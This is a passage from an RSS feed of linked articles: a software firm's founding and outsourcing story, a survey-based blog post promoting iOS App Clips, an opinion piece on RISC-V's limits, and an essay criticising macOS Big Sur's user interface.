Snow</p></div><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>A few weeks (or maybe a few months) later, Wes calls me with a proposition of sorts. A company that had implemented a contact management system for his current employer had been acquired by a startup out of Arizona and was looking for reseller/implementation partners. </span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>Wes had become a good acquaintance of&nbsp;</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>the&nbsp;</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>acquired company</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>’s owner</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>, and he was now trying to recruit partners in Dallas. </span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>So, <strong>Wes called me with the idea that we would fly to Scottsdale, get trained, and certified to start selling and supporting productivity software for salespeople (now known as CRM). </strong></span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>It seemed like a terrible idea to me at the time, but I was up for a junket to Scottsdale with my good buddy, so I agreed.</span></span></p></div><div><div><div><div><p> <iframe data-data-cli-class="cli-blocker-script" data-cli-label="Youtube embed" data-cli-script-type="" data-cli-block="true" data-cli-block-if-ccpa-optout="false" data-cli-element-position="body" data-cli-placeholder="Accept consent to view this" data-cli-src="https://www.youtube.com/embed/to5BRgwlHr0?rel=0&amp;autoplay=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></div></div></div></div><div data-bg="https://ascendixtech.com/wp-content/uploads/2020/12/cta-background.jpg"><div><div><div><div><h4>Get Our Software Development Hourly Rates</h4><p>Looking for a software development partner? Answer our quick quiz to get a ball-park cost of developing your software</p></div></div></div></div></div><div data-anchor="First Steps Towards the Launch "><h2><strong>First Steps Towards the Launch</strong></h2><p><span data-contrast="none">In retrospect, the trip was life-changing. </span></p><p><span data-contrast="none">In less than two weeks, we both learned how to implement and customize a </span><span data-contrast="none">rather sophisticated</span><span data-contrast="none">&nbsp;client-server system that had&nbsp;</span><span data-contrast="none">cutting edge</span><span data-contrast="none">&nbsp;remote database synchronization capabilities (in 1996)</span><span data-contrast="none">. </span></p><p><span data-contrast="none">They were</span><span data-contrast="none">&nbsp;perfect for a remote field sales team, as connectivity&nbsp;</span><span data-contrast="none">wasn’t</span><span data-contrast="none">&nbsp;so ubiquitous then. </span></p><p><span data-contrast="none">Wes and I both had some technical background from our university&nbsp;</span><span data-contrast="none">coursework</span><span data-contrast="none">, so we understood&nbsp;</span><span data-contrast="none">high-level</span><span data-contrast="none"> concepts, but this was our first jump into the realm of business software solutions.</span></p></div><div><div><p> <span>“</span> We didn’t understand fully at the time, but to be successful with what would&nbsp;become today’s CRM software, we needed to become experts at “sudden expertise:”&nbsp;the idea that a consultant can drop into your business, learn it in a matter of a few days, then propose how to tailor a productivity system to help them do business…&nbsp;better.&nbsp; <span>”</span></p></div></div><div><p>We had no typical client – they were small, medium, and large, financial, hospitality, manufacturing, healthcare, construction, and heavy equipment, but they were all&nbsp;trying to solve the same pains.</p><p>They wanted to&nbsp;help their customer-facing workers make better-informed decisions, and somehow gain visibility into what was happening with their sales pipeline.</p></div><div data-anchor="Primary Ups and Downs "><h2><strong>Primary Ups and Downs</strong></h2><p><span data-contrast="none">We had some early successes that helped fund our business. </span></p></div><div data-bg="https://ascendixtech.com/wp-content/uploads/2020/10/cta-background.jpg"><div><div><div><p><h4><strong>Our second customer, a member of the Fortune 500, found us on the Internet and never asked us for references.</strong></h4></p></div></div></div></div><div><p>They just liked us, our presentation (we flew to their&nbsp;headquarters&nbsp;to present), and our price, and accepted our proposal for a&nbsp;200-user system that was meant to be temporary while their department waited in line for an upcoming Siebel implementation.</p><p><span data-contrast="none">We&nbsp;</span><span data-contrast="none">maneuvered</span><span data-contrast="none">, worked with the administrative assistant of the department head, and in a matter of&nbsp;</span><span data-contrast="none">10</span><span data-contrast="none">-12 weeks had this department of a Fortune 500 company with a new, successfully running system that they used for years. </span></p><p><strong>(Funny fact, their server sat under the desk of the admin assistant, unknown and untouched by the IT team for more than a year before it was finally brought into the server room.) </strong></p><p><span data-contrast="none">This referenceable Fortune 500 client (whose name exists </span><span data-contrast="none">in</span><span data-contrast="none">&nbsp;NFL stadiums) would help us continue our success for many more years.</span></p><p><span data-contrast="none">We also had our share of failures, and from these, we really learned about what makes good software and a successful project, and this became part of our company DNA. </span></p><p><span data-contrast="none">Our failures were primarily due to taking on projects with compromises – projects where we didn’t focus on the user’s needs, but the needs of those managing the users. </span></p><p><span data-contrast="none">This&nbsp;</span><span data-contrast="none">experience&nbsp;</span><span data-contrast="none">allowed us to&nbsp;</span><span data-contrast="none">learn how to advocate for the user in order to help their managers and stakeholders achieve their objectives as well.</span></p></div><div data-anchor="Defining Our Competitive Advantage "><h2><strong>Defining Our Competitive Advantage</strong></h2><p><span data-contrast="none">Enterprise business software is not user friendly. </span></p><p><span data-contrast="none">It’s generally not well-liked by users (especially salespeople, who are typically successful for reasons other than good computer skills). </span></p><p><span data-contrast="none">It’s usually hard to find information, </span><span data-contrast="none">difficult</span><span data-contrast="none">&nbsp;to act on this&nbsp;</span><span data-contrast="none">data,</span><span data-contrast="none">&nbsp;and&nbsp;</span><span data-contrast="none">tough&nbsp;</span><span data-contrast="none">to use this information in a way that helps you be a more effective professional.</span></p></div><div data-bg="https://ascendixtech.com/wp-content/uploads/2020/10/cta-background.jpg"><div><div><div><p><h4><strong>Comparing today’s business productivity software to what we used 25 years ago, in my opinion,&nbsp;evolution has been slow and unremarkable.</strong></h4></p></div></div></div></div><div><p><span data-contrast="none">Yes, that remote database syncing client-server system Wes and I learned to implement and customize back in 1996 is quite ugly and out-of-date looking compared to today’s interface in Salesforce or Dynamics, but the functionality is remarkably unchanged. </span></p><p><strong>Moreover,&nbsp;the challenges we faced&nbsp;then&nbsp;are still real today:&nbsp;user adoption, user stickiness.</strong></p><p><span data-contrast="none">I</span><span data-contrast="none">’ll never forget the day, about 10 years ago, I was sitting in a conference room in Seattle for a global commercial real estate client (400+ offices and 15K people). </span></p><p><span data-contrast="none">We had just wrapped phase 1 of the project and completed a full day’s training for our first wave of users. </span></p><p><span data-contrast="none">The president, who was deeply involved in the project since the vendor selection stage looked at me and said: “Todd, you guys have done a great job building exactly what we’ve looked for, but I still wonder why CRM software still has to be so hard to use.” </span></p><p><span data-contrast="none">I was a bit taken aback, as 75% of our solution for commercial real estate was more about usability, and the other 25% specifically about real estate, and he just said it was still hard to use.</span></p></div><div><div><p> "<strong>You should build your products like Apple. Like LinkedIn. Like Amazon.</strong> If I can network on LinkedIn, or build my playlist on Apple, or find the products I need on Amazon without going through a full day of training, then I should be able to do the same with your software. While yours is the best I’ve seen, I think it can be better!"</p><p><h6>- Ascendix client</h6></p></div></div><div><p><span data-contrast="none">I made my informed excuses about enterprise software – that you must give up some usability in order to have flexibility and customizability. </span></p><p><span data-contrast="none">He reluctantly agreed, but I got his point.</span></p><p><span data-contrast="none">Our differentiator over these 25 years started by advocating for the user and making our client’s software easier to use. </span></p><p><span data-contrast="none">We hired&nbsp;</span><span data-contrast="none">really smart</span><span data-contrast="none"> and talented developers who could develop and implement seamlessly integrated usability solutions to otherwise hard-to-use software.</span></p></div><div data-bg="https://ascendixtech.com/wp-content/uploads/2020/10/cta-background.jpg"><div><div><div><p><h4><strong>We made it easier for users to search for information, easier for users to organize the information, easier to act on it.</strong></h4></p></div></div></div></div><div><p><span data-contrast="none">We put ourselves in our users’ shoes and mapped end-to-end process flow with the system, and then built plug-ins to plug the holes in those end-to-end flows. </span></p><p><span data-contrast="none">We started using these solutions for all our implementations, then started to use it as a framework to combine it with our growing business experience in certain industries (Commercial Real Estate, Financial Services, Professional Services) as modules and industry solutions. </span></p><p><span data-contrast="none">The first industry solution we built for companies who sold private REIT products to registered representatives, which fueled our start in software development until the global financial crisis arrived in 2007.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p><p><iframe data-cli-class="cli-blocker-script" data-cli-label="Youtube embed" data-cli-script-type="" data-cli-block="true" data-cli-block-if-ccpa-optout="false" data-cli-element-position="body" data-cli-placeholder="Accept consent to view this" data-cli-src="https://www.youtube.com/embed/Vcq0PQVwnIQ" width="100%" height="515" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p></div><div data-anchor="Outsourcing Software Development"><h2><strong>Starting a Software Development Outsource Story </strong></h2><p><span data-contrast="none">Our journey also took us to different parts of the world.&nbsp;</span></p><p><span data-contrast="none">Wes and I decided to bootstrap our product development with a combination of reinvestment of profits and debt vehicles.</span></p><p><strong> This&nbsp;meant a model where we develop software that may not bring us revenue for months, or sometimes even years after an investment&nbsp;of&nbsp;capital. </strong></p><p><span data-contrast="none">We looked for ways to stretch the dollar, which inevitably means outsourcing. </span></p><p><span data-contrast="none">Our vendor&nbsp;</span><span data-contrast="none">search</span><span data-contrast="none">&nbsp;took us to China and India. Then, hurting from the lost hours due to cultural and time differences, we&nbsp;</span><span data-contrast="none">near-shored</span><span data-contrast="none"> in Argentina and Mexico.</span></p><p><strong>It wasn’t&nbsp;successful&nbsp;until we worked&nbsp;on a&nbsp;special pilot project with a company in Ukraine that we became real believers that outsourcing could work so effectively. </strong></p><p><span data-contrast="none">After a couple of very successful years working&nbsp;</span><span data-contrast="none">as</span><span data-contrast="none"> a partner, we decided it was time to continue our growth by acquiring our team and establishing our own location there.</span></p></div><div data-bg="https://ascendixtech.com/wp-content/uploads/2020/10/cta-background.jpg"><div><div><div><p><h4><strong>Our team,&nbsp;from&nbsp;our original 8 members,&nbsp;was around 30 when they made the transition, and now we are on our way to 200.</strong></h4></p></div></div></div></div><p><span data-contrast="none">The original team architected our search and big data solutions, and now we have 6 separate product offerings: from industry-specific solutions on Salesforce and Dynamics to mobile, desktop, marketing, and publishing solutions architected with various technologies in </span><a href="https://ascendixtech.com/technologies/net-application-development/"><span data-contrast="none">.NET</span></a><span data-contrast="none">, <a href="https://ascendixtech.com/technologies/java-software-development/">Java</a>, <a href="https://ascendixtech.com/technologies/javascript-app-development/">JavaScript</a>, and <a href="https://ascendixtech.com/technologies/xamarin-app-development/">Xamarin</a>, leveraging search and data platforms like Elasticsearch, Couchbase, Cosmos DB and deployed through Azure and Amazon cloud.</span></p><div><div><p> <span>“</span> We have evolved our services/custom&nbsp;software&nbsp;development practice largely based on our experiences with more than 20 years of user-centric advocacy and best practices for product development and support. <span>”</span></p><p><h6>Todd Terry, CTO &amp; Managing Partner</h6></p></div></div><div><p>We have&nbsp; Agile project teams, dedicated client teams, or anything in between.</p><p><strong>We’ve evolved a great practice where we can run a project in the US, blend a team from Ukraine, or run it entirely out of Ukraine with personnel who have very …</strong></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ascendixtech.com/software-development-outsourcing-our-story/">https://ascendixtech.com/software-development-outsourcing-our-story/</a></em></p>]]>
            </description>
            <link>https://ascendixtech.com/software-development-outsourcing-our-story/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26002217</guid>
            <pubDate>Tue, 02 Feb 2021 15:39:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: Mobile CX Issues Highlight Use Cases for iOS App Clips]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26002147">thread link</a>) | @encorekt
<br/>
February 2, 2021 | https://www.heady.io/blog/market-study-mobile-customer-experience-issues-highlight-use-cases-for-ios-app-clips | <a href="https://web.archive.org/web/*/https://www.heady.io/blog/market-study-mobile-customer-experience-issues-highlight-use-cases-for-ios-app-clips">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      

      
      <div>
        <h2>How is exploding app growth affecting consumer behavior?</h2>
<p>The mobile app economy is expected to double by 2024 and reach a staggering <strong><a href="https://techcrunch.com/2020/04/01/mobile-app-spending-to-double-by-2024-despite-economic-impacts-of-covid-19/#:~:text=For%20starters%2C%20global%20spending%20in,year%20to%20hit%20%24102%20billion.">$171 billion</a></strong>. That’s roughly the value of the entire <strong><a href="https://www.macrotrends.net/stocks/charts/MCD/mcdonalds/market-cap">McDonald’s Corporation</a></strong>.</p>
<p>Is your company looking to carve out a piece of that multi-billion-dollar pie?</p>
<p>With nearly <strong><a href="https://www.lifewire.com/how-many-apps-in-app-store-2000252">2 million apps</a></strong> available in Apple’s App Store and <strong><a href="https://www.statista.com/statistics/1020964/apple-app-store-app-releases-worldwide/#:~:text=Number%20of%20monthly%20Apple%20App%20Store%20app%20releases%20worldwide%202020&amp;text=This%20statistic%20shows%20the%20average,through%20the%20Apple%20App%20Store.">30,000 more</a></strong> added every month, so is everyone else.</p>
<p>We wanted to know how the app economy’s exploding growth is affecting consumer behavior, so we surveyed smartphone users to find out.</p>
<p>Specifically, as more brands launch and promote their own mobile apps, we wanted to know how users feel when they’re required to install these apps to place an order, use a product or try a service.</p>
<ul>
<li><strong>Did they find it frustrating?</strong></li>
<li><strong>How likely were they to install the app?</strong></li>
<li><strong>How regularly do they delete apps?</strong></li>
<li><strong>Does deleting an app affect their opinion of a brand?</strong></li>
</ul>
<p>Our research uncovered 11 app statistics that highlight significant customer pain points with the current state of mobile transactions. Going forward, companies must find solutions to these pain points. Those that don’t risk suffering both decreased market share and irrelevance.</p>
<p>With iOS 14, Apple is giving businesses a solution: <strong>App Clips.</strong></p>
<p>App Clips are small, lightweight portions of your full app that isolate a specific functionality and offer it to users as needed. They integrate seamlessly into tasks mobile users already are performing—such as browsing the web, searching for location-based recommendations or scanning visual tags—and offer brands organic opportunities to step in and provide value.</p>
<p>If you’re trying to rise above the noise in today’s overcrowded mobile app landscape, Apple iOS 14’s new App Clips are a no-brainer.</p>
<p>These 11 app statistics illustrate why.</p>
      </div>
      
      
      


    </div>
  </div><div>
    <div>
      

      
      <div>
        <h3>The Take-Home Message</h3>
<p>Let’s recap what the data tells us about the current mobile app-related purchasing experience:</p>
<ul>
<li><strong>68.5% of mobile phone users are moderately or extremely frustrated when they’re required to install an app to complete a transaction.</strong></li>
<li><strong>77.9% report abandoning a transaction because they didn’t want to install a required app.</strong></li>
<li><strong>30.3% say they’ve saved at least $100 in the last year by abandoning these transactions, with 7.8% saving at least $500.</strong></li>
<li><strong>58.5% who ultimately decide to install the required app still find the whole experience moderately or extremely frustrating and are 65.2% more likely to clean out their app inventory by deleting apps every week.</strong></li>
<li><strong>31.6% say deleting an app makes them think less of the company that created the app.</strong></li>
</ul>
<h3>Where Apps Are Falling Short Today</h3>
<p>Those app statistics paint a clear picture and highlight three purchase-related pain points and inefficiencies:</p>
<p><strong>1. Astounding numbers of abandoned transactions due to that frustration </strong></p>
<p><strong>2. Increasing user demand for mobile apps</strong></p>
<p><strong>3. Persistent and pervasive consumer frustration with current app-driven checkout processes</strong></p>
<p>Add all that up, and there’s an obvious and growing reservoir of unmet demand waiting to be tapped by businesses that can create seamless online purchasing experiences that facilitate instead of frustrate.</p>
<blockquote>iOS App Clips presents businesses with a high-impact way to increase mobile app downloads, build positive brand sentiment and increase customer engagement by leveraging the functionality currently built into their mobile app.</blockquote>

<h4>iOS 14 is Empowering Brands</h4>
<p>With the introduction of App Clips in iOS 14, Apple is giving businesses a way to do just that by enabling organic, frustration-free, app-powered checkout processes. Now, businesses can embed select portions of their full mobile app’s functionality for customers to interact with natively without requiring installation.</p>
<p>This addresses all three of those pain points and inefficiencies:</p>
<p><strong>1.Customers aren’t required to install an app to complete their transaction and enjoy a smooth, positive experience.</strong></p>
<p><strong>2.Businesses capture more sales. </strong></p>
<p><strong>3.Customers associate their positive experience with both the business’s mobile app and brand, making them more likely to install the full app for future transactions.</strong></p>
<p>iOS App Clips presents companies with a high-impact way to increase mobile app downloads, build positive brand sentiment and increase customer engagement by leveraging the functionality currently built into their mobile app.</p>
<p>And for businesses that don’t have a mobile app but want to take advantage of App Clips to create a customer-centric experience, now is the perfect time to design, build and launch an app with App Clips in mind.</p>

      </div>
      
      
      


    </div>
  </div></div>]]>
            </description>
            <link>https://www.heady.io/blog/market-study-mobile-customer-experience-issues-highlight-use-cases-for-ios-app-clips</link>
            <guid isPermaLink="false">hacker-news-small-sites-26002147</guid>
            <pubDate>Tue, 02 Feb 2021 15:35:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RISC-V isn’t as interesting as you think]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 145 (<a href="https://news.ycombinator.com/item?id=26001972">thread link</a>) | @glhaynes
<br/>
February 2, 2021 | https://sporks.space/2021/02/01/risc-v-isnt-as-interesting-as-you-think/ | <a href="https://web.archive.org/web/*/https://sporks.space/2021/02/01/risc-v-isnt-as-interesting-as-you-think/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-47">
	<!-- .entry-header -->

	
		<div>
			
<p><em>I had wrote this before the Unleashed was revealed, so some of the bits on economics have changed. As of writing this, I still stand by my other beliefs. </em>One of the most hyped things in hardware design is RISC-V, the open ISA available without license fees. Many organizations including <a href="https://www.westerndigital.com/company/innovations/risc-v">Western Digital</a> have pledged support for RISC-V, and the open source community has a lot of faith in it, and with <a href="https://www.anandtech.com/show/16080/nvidia-to-acquire-arm-for-40-billion">Nvidia’s recent purchase of Arm</a>, people are concerned. However, I feel these hopes are somewhat misleading, as RISC-V’s openness is less at the benefit of the user and more for CPU vendors.</p>

<p><strong>Royalties</strong>. One of the biggest benefits of RISC-V is not having to pay any royalties for a CPU using it. You might pay SiFive or someone else for a realization of their cores on hard silicon, but that’s for the design, not an abstract implementation of the ISA. Openness here means there’s more profit margin on the tiny chips running washing machines, since they don’t have to pay ARM or Synopsys. While the savings could be passed onto you, the ISA’s openness will never be of concern when the program is on a one-time-programmable ROM.</p>



<p><strong>ISA fragmentation</strong>. RISC-V intentionally defines a small ISA with extensions (for example, multiplication, which actually encompasses divide too… which is even more expensive to implement than multiply, but it’s a package deal). While most larger implementations will implement a common set of extensions, having basic functionality in extensions could make software compatibility for binary distributions harder. This is made worse by RISC-V explicitly encouraging custom instructions for task-specific tweaks on vendor silicon – great for embedded, not so hot for general purpose computers and operating systems supporting them.</p>



<p><strong>Economics</strong>. RISC-V has actively courted embedded, which makes sense as a niche. Much of the hype of RISC-V is hoping for laptop/desktop/server class silicon. This is unlikely, because the economics of embedded are different. ISA doesn’t matter as much in embedded programming (code reuse matters, but it’s not like you’re running arbitrary binaries), whereas user/enterprise focused computing usually lives and dies by binary compatibility (to protect investments in existing applications) and performance gained by things most RISC-V implementations don’t have yet like superscalar execution (To say nothing how these impact implementation complexity and security!).</p>



<p><strong>Openness doesn’t tickle down</strong>. The openness of an ISA doesn’t have much impact on the implementation. A design with restricted signing keys is completely acceptable under their licensing – and is very likely, considering the embedded dominance RISC-V is likely to have. There are no guarantees of openness in ways that impact a user (i.e controlling the root of trust), since a user doesn’t exactly have access to a fab.</p>



<p><strong>Design flaws</strong>. RISC-V seems like it hasn’t learned anything from CPUs designed after 1991. Between some <a href="https://gist.github.com/erincandescent/8a10eeeea1918ee4f9d9982f7618ef68">rookie mistakes</a> like few <a href="https://lobste.rs/s/yqqhxu/llvm_for_m68k_completed_not_merged">addressing modes</a> (register churn, code density) and <a href="https://lobste.rs/s/icegvf/will_risc_v_revolutionize_computing#c_8wbb6t">blowing out the encoding space</a>. However, despite its flaws, it’s poised to take over embedded and possibly beyond anyways – worse truly is better.</p>



<p>Overall, RISC-V will lead in a revolution for nationalist vanity CPUs (think Loongson; no one will run them but for show and perhaps a niche of radical ideologues) , academic projects, and embedded vendors wanting to save on their balance sheets, but it probably won’t affect users or developers.</p>
					</div><!-- .entry-content -->

	
	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://sporks.space/2021/02/01/risc-v-isnt-as-interesting-as-you-think/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001972</guid>
            <pubDate>Tue, 02 Feb 2021 15:24:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Reshaped Mac Experience]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 71 (<a href="https://news.ycombinator.com/item?id=26001540">thread link</a>) | @yannovitch
<br/>
February 2, 2021 | http://morrick.me/archives/9150 | <a href="https://web.archive.org/web/*/http://morrick.me/archives/9150">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Yesterday, a short <a href="https://twitter.com/lapcatsoftware/status/1355514848717791234">Twitter thread</a> by the excellent <a href="https://lapcatsoftware.com/articles/">Jeff Johnson</a> caught my eye. Since he often deletes past tweets, I’ll quote the relevant ones here (emphasis mine):</p>
<blockquote><p><strong>The selling point of the Macintosh was never the hardware, it was the user interface. So if the selling point now is the hardware, that’s a damning indictment of the current user interface.</strong></p>

<p><strong>I cannot emphasize enough how everyone seems to have lowered their standards with regard to the user interface.</strong> The “<a href="https://en.wikipedia.org/wiki/Overton_window">Overton window</a>” has moved. The Overton window now has rounded rects.</p>

<p>We’ve gone from “insanely great” and “It just works” to “Catalyst is good enough for most people.”</p>
<p>That’s fucking BS, and I won’t tolerate it.</p>

<p>Windows is “good enough for most people”. That’s why Windows has a 90% market share. Why should we aspire to that level, shouldn’t we have much higher aspirations? Mac is a niche. “Most people” are not even using Macs, so the majority is not even relevant. Mac is a premium brand.</p>

<p>The way I see it, the Mac now is merely milking the brand reputation and loyalty it previously built. That Jobs previously built. But neither Cook nor the current Mac deserves that reputation or loyalty.</p>

<p>Steve Jobs wasn’t an engineer. Not a hardware engineer, not a software engineer. At Apple, his role was as “proxy” for the&nbsp;users.</p>
<p>Apple no longer has a proxy for the users. Tim Cook is a proxy for the shareholders, nothing more.</p></blockquote>
<p>Jeff himself says that this criticism is hardly new, that these are things he already pointed out “a thousand times, to no effect”. While I am in no position to affect Apple or Mac development, this short Twitter rant had the effect of reminding me of something I, too, believe in; something I myself should emphasise more frequently. It’s those first two tweets I’ve quoted above.</p>
<p>As someone who still puts vintage Macs and older computers and devices to good use, the Mac’s user interface and user experience are in large part what still makes using 15–20-year-old machines enjoyable. This, by the way, also applies to other products of course. It’s thanks to well-designed user interfaces that we enjoy driving a classic car, or shooting with a 50-year-old film camera, or listening to vinyl records on a 40-year-old record-player and hi-fi stereo.</p>
<p>A couple of weeks ago I was on a group videochat with some friends and when I said that, frankly, using my 12-inch PowerBook G4 (2003) with Mac OS X 10.5 Leopard was more enjoyable than using my 13-inch retina MacBook Pro (2015) with Mac OS 11 Big Sur, the common reaction was that I was just being ‘nostalgic’; that surely my MacBook Pro was the better choice because it is orders of magnitude faster, with a ‘more modern’ OS, and that the sum of those parts was a better Mac experience. That I should ‘be rational’ and accept that.</p>
<p>Here, bringing up nostalgia is missing the point. And the point is that an admittedly faster hardware plus a purportedly ‘more modern’ operating system <em>do not necessarily</em> equal a better Mac experience. It’s interesting that my friends’ reaction was not to ask me <em>why</em> I was finding using an 18-year-old machine more enjoyable than an up-to-date Mac, but to promptly want to readjust my enjoyment, implying that there was something ‘wrong’ with&nbsp;it.</p>
<p>I’m finding that many people not only have lowered their standards with regard to the user interface, but more and more often when I bring up the subject, they seem to consider it a somewhat secondary aspect, something that’s only good for ‘geek talk’. The same kind of amused reaction laymen have to wine or coffee connoisseurs when they describe flavours and characteristics using specific lingo. Something that makes sense only to wine or coffee geeks but has little to no meaning or impact for the regular person.</p>
<p>The problem is that if an increasing number of people start viewing user interface design as an afterthought, or something that isn’t fundamental to the design of a product or experience — it’s all just ‘geek talk’ — then there is a reduced incentive to care about it on the part of the maker of the product. It’s more like a vicious circle, really; if Apple software’s quality declines but only a bunch of professional users and enthusiasts point that out, then Apple isn’t particularly incentivised to do a better job at it — the “good enough for most people” is really a dangerous, self-indulgent excuse. And in turn most people are fine with it, and in turn Apple think they’re on a ‘good’ path, and so&nbsp;forth.</p>
<p>At the very end of my piece <a href="http://morrick.me/archives/9141"><em> What about the M1 Macs?</em></a>, I&nbsp;wrote:</p>
<blockquote><p>They’re unbelievably good machines, and everything that is genuinely good about them and future Apple Silicon-based Macs — sheer performance, astounding power-efficiency, and great backward compatibility with Intel software thanks to Rosetta 2 — will also allow Apple to get away with a lot of things with regard to platform control, design decisions, and so&nbsp;forth.</p></blockquote>
<p>If you take a look at Jason Snell’s <a href="https://sixcolors.com/post/2021/01/apple-in-2020-the-six-colors-report-card/"><em>Apple in 2020: The Six Colors report card</em></a>, the Mac scored very good points overall, 4.7 out of 5, with a year-over-year increment of 1.1 points. The main reason has been of course the M1 Macs and Apple Silicon. Don’t get me wrong, Apple Silicon <em>is</em> groundbreaking, and Rosetta 2 is really an incredible performer on the software side. But what I contend is that a leap in hardware architecture and performance doesn’t necessarily mean that suddenly all is fine with the Mac as a platform or as an experience.</p>
<p>The Mac’s user interface is undergoing plastic surgery by the hand of surgeons who have studied on iOS books. The result is pretty much the same as when you see a favourite celebrity after a procedure. They look ‘younger’ but there’s also something weird about their appearance. Their traits have changed a bit. In certain cases you almost fail to recognise the person at first glance.</p>
<p>Similarly, the Mac experience today feels disjointed. The hardware has unquestionably improved with the introduction of Apple Silicon, and yes, it’s something worth celebrating and it’s something worth praising. On the other hand, the software that drives this hardware is a bit of a paradox: Big Sur and Apple Silicon Macs fit and work together well from a technical, architectural standpoint. From a user interface standpoint, however, Big Sur embodies what I’ve been fearing in recent years — a progressive iOS-ification of Mac OS. Big Sur provides a general user experience that is the least Mac-like in the history of the Mac. Going through Big Sur’s user interface with a fine-tooth comb reveals arbitrary design decisions that prioritise looks over function, and therefore reflect an un-learning of tried-and-true user interface and usability mechanics that used to make for a seamless, thoughtful, enjoyable Mac experience.</p>
<p>iOS was born as a ‘spinoff’ of Mac OS X, a sort of Lite version aimed at mobile devices like the iPhone and the iPod touch. The two platforms have maintained their separate paths and trajectories for years, and for a while using a Mac and an iPhone (or iPad) felt like having the best experience of each world. Then Apple became obsessed with thoughts of convergence, and features, UI ideas, paradigms, started bleeding through both platforms and in turn the respective experiences have become less clear-cut over time, with the software not fully capable of bringing out all that hardware power and potential.</p>
<p>This convergence will continue, of course, with Macs becoming more and more like ‘senior iOS devices’ from a UI and user experience standpoint. It seems clear to me that Apple is prioritising ecosystem experience because, let’s be honest, having a unified ‘operating system core’ underlying all platforms means having fewer framework-specific headaches and probably a faster, streamlined process when deploying new features. But this loss of differentiation is especially detrimental to Mac OS, which is being reduced to the lowest common denominator and loses an increasing amount of user interface ideas and conventions that were central to its superior user experience and ease of&nbsp;use.</p>
<p>I’m not annoyed because I see pieces of UI history fading away. I’m annoyed because I see pieces of <em>good</em> UI design fading away and being replaced by decisions that are puzzling and arbitrary, or the product of a trial-and-error process, rather than a meaningful, purposeful design.</p>
<p>You want an example that I find particularly glaring? Big Sur’s UI features a general increase of space between elements — icons, menus, labels, toolbars, sidebars, pretty much everywhere. On the surface it doesn’t seem like a bad decision. If you zoom in on certain parts of the user interface, you could say that more space between elements means that things looks cleaner, airier, sleeker.</p>
<p>But you’re looking at it on a 27-inch retina display. What about a display half that size? What about an 11-inch, non-retina display, like the one of the older 2013–2015 MacBook Airs that can be updated to Big Sur? It’s less pretty.</p>
<p><a href="https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png"><img loading="lazy" src="https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=960%2C600" alt="" width="960" height="600" srcset="https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?w=2560 2560w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=260%2C163 260w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=640%2C400 640w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=768%2C480 768w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=1536%2C960 1536w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=2048%2C1280 2048w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?resize=1194%2C746 1194w, https://i0.wp.com/morrick.me/wp-content/uploads/2021/01/Big-Sur-13-MBP-2.png?w=1920 1920w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></a></p>
<p>I usually work with a lot of app windows and Finder windows, but when I’m using my 13-inch retina MacBook Pro with Big Sur, the workspace constantly feels cramped, while on the other hand I have no problems using High Sierra on my 11-inch MacBook Air. Sometimes it feels like looking at a zoomed-in interface. That increased space between elements becomes less of a good idea because it doesn’t scale gracefully when the overall screen real estate is reduced. It becomes an interference. Before installing Big Sur, the amount of icons on the right of the menu bar had never really been a concern. Now, the simple addition of a couple of third-party apps like Dropbox and iStat Menus — both essential for me — is enough to make that menu bar look crowded. (And thankfully Apple has been reducing the space between menu icons, because in the first Big Sur betas icon padding was so bad I had to remove a few icons and use Control Centre to check on their status).</p>
<p>This, like other UI design decisions in Big Sur, feels like …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://morrick.me/archives/9150">http://morrick.me/archives/9150</a></em></p>]]>
            </description>
            <link>http://morrick.me/archives/9150</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001540</guid>
            <pubDate>Tue, 02 Feb 2021 14:49:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CompilerGym: A toolkit for reinforcement learning for compiler optimization]]>
            </title>
            <description>
<![CDATA[
